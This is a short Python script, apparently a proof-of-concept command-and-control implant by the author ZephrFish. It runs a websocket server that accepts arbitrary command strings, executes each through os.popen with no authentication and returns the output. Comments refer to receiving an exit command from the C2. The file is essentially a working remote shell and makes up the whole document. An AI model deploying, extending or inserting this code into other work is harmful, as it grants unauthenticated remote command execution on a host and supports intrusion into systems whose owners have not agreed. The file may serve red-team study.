#!/usr/bin/env python
# WebSockets Server 
# ZephrFish

import asyncio
import websockets
import os 

# Reqs:
#   Ability to receive commands and execute them

# async def send_cmds(websocket):
#     while cmd != 'exit':
#         cmd = input("Enter Command To Run: ")
#         await websocket.send(cmd)
#         print(f"Sending {cmd}")
#         cmd_output = await websocket.recv()
#         print("Output from Command: ")
#         print(f"Received: {cmd_output}")
#     else:
#         print("Exiting Gracefully")
#         exit()

# Colours
def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
def prCyan(skk): print("\033[96m {}\033[00m" .format(skk))
def prYellow(skk): print("\033[93m {}\033[00m" .format(skk))



async def hello(websocket, path):
    cmd = await websocket.recv()
    print(f"Command Received: {cmd}")
    
    
    # Print back output from commands and send them to client
    output = os.popen(cmd).read()

    await websocket.send(output)
    # Listen for exit command from C2
    if cmd == "exit":
        prRed("Exit command received, exitting...")
        exit()
    
    # prCyan("Output Received: ")
    # cmdrec = await websocket.recv()
    # prGreen(cmdrec)

    

    prYellow("Waiting for input...")

# Listen on host and port specified
start_server = websockets.serve(hello, 'localhost', 8765)

asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()